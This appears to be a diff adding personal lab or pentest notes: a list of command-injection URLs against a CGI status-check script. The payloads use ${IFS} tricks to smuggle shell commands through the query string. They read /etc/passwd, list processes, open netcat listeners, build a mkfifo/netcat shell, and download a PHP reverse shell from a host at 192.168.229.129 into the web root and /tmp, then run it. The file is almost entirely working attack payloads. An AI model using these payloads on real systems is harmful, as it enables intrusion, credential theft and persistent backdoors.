@@ -1,0 +1,48 @@
+https://localhost/cgi-bin/status_check.cgi?mysqld;nc${IFS}-lvp${IFS}48080;grep
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;nc${IFS}-lvp${IFS}48080;grep
+
+Get the password file
+https://localhost/cgi-bin/status_check.cgi?mysqld;less${IFS}/etc/passwd;grep
+
+Get the running processes
+https://localhost/cgi-bin/status_check.cgi?mysqld;ps${IFS}-axu;grep
+
+Reverse shell attack
+
+rm -f /tmp/f; mkfifo /tmp/f
+
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;rm${IFS}-f${IFS}/tmp/f;mkfifo${IFS}/tmp/f;grep
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;rm${IFS}-f${IFS}/tmp/f;mkfifo${IFS}/tmp/f;grep
+
+cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2%3E%261${IFS}|nc${IFS}-l${IFS}127.0.0.1${IFS}48080${IFS}>${IFS}/tmp/f;grep
+
+
+%3E
+
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2%3E%261${IFS}|nc${IFS}-l${IFS}127.0.0.1${IFS}48080${IFS}%3E${IFS}/tmp/f;grep
+
+
+cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2%3E%261${IFS}|nc${IFS}-l${IFS}127.0.0.1${IFS}48080${IFS}%3E${IFS}/tmp/f
+
+cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2%3E%261${IFS}|nc${IFS}-l${IFS}127.0.0.1${IFS}48080${IFS}>${IFS}/tmp/f
+
+
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2>1${IFS}|nc${IFS}-l${IFS}127.0.0.1${IFS}48080${IFS}>${IFS}/tmp/f;grep
+
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;wget${IFS}http://192.168.229.129:8000/rs.php${IFS}-P${IFS}/opt/lampp/htdocs/se/;grep
+
+
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;wget${IFS}http://192.168.229.129:8000/rs.php${IFS}-P${IFS}/tmp/;grep
+
+
+https://localhost/cgi-bin/status_check.cgi?mysqld;/opt/lampp/bin/php${IFS}/tmp/rs.php;grep
+
